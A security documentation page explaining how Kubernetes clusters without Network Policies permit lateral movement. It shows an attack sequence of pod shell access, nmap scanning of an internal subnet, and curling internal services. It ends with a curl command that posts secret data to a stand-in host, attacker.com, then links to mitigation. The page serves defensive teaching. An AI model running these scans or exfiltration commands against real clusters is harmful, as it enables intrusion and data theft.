---
sidebar_position: 5
title: "Lack of Network Policies"
description: "How missing Kubernetes Network Policies enable lateral movement and data exfiltration by attackers."
---

# Lack of Network Policies

When Kubernetes clusters are deployed without Network Policies, **all pods can communicate freely with one another**. This default behavior poses a serious risk: it allows an attacker who gains access to any pod to move laterally throughout the cluster, access internal services, and exfiltrate data without restriction.

This article demonstrates how a lack of network segmentation enables **lateral movement and sensitive data exposure**.

---

## Exploitation Steps: Lateral Movement in Kubernetes

An attacker compromises a low-privileged pod in the cluster and uses it as a pivot point.

### Step 1: Gain Shell Access to the Pod

```bash
kubectl exec -it <compromised-pod> -- /bin/sh
```

### Step 2: Discover Internal Services

With unrestricted network access, the attacker installs common scanning tools to enumerate services:

```bash
apt-get update && apt-get install -y nmap
nmap -p 80,443,8080 10.0.0.0/24
```

### Step 3: Access Unprotected Services

After identifying service IPs, the attacker connects to internal APIs or databases directly:

```bash
curl http://10.0.0.15:8080/secret-data
```

### Step 4: Exfiltrate Data

Sensitive information is sent outside the cluster via an outbound HTTP request:

```bash
curl -X POST -d @/path/to/secret-data http://attacker.com/upload
```

---

## Result

Without any Network Policies in place:

- Lateral movement goes **unrestricted**.
- Internal services are **exposed** across the cluster.
- Data can be **exfiltrated externally** without detection or limitation.

---

## Mitigation

To prevent lateral movement and reduce your cluster's attack surface:

➡ [Harden your cluster with Kubernetes Network Policies](/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies)
